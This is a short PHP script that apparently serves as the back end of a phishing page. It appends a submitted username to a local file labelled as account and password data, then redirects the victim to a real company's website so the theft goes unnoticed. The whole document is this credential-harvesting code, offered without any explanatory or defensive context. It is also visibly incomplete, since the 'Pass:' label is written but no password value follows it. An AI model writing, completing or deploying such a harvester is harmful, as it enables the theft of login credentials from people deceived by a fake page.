<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . "\n", FILE_APPEND);
header('Location: https://yoco.com');
exit();
